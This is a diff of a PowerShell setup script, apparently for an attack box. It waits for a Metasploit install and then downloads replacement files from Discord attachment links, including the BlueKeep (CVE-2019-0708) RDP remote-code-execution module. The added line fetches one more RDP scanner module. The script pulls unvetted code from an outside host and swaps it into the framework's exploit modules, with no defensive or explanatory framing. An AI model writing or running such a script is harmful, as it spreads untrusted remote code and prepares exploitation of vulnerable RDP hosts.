@@ -5,6 +5,7 @@ while (!(Test-Path "C:\metasploit-framework\embedded\framework\lib\msf\ui\consol
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823520573283237908/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
 while (!(Test-Path "C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")) { Start-Sleep 10 }
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823214074632470538/cve_2019_0708_bluekeep_rce.rb.txt","C:\metasploit-framework\embedded\framework\modules\exploits\windows\rdp\cve_2019_0708_bluekeep_rce.rb")
+$WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/822790893685440543/azirdp2.rb","C:\metasploit-framework\embedded\framework\modules\auxilary\scanner\rdp\azirdp2.rb")
 
 
 $i = 360
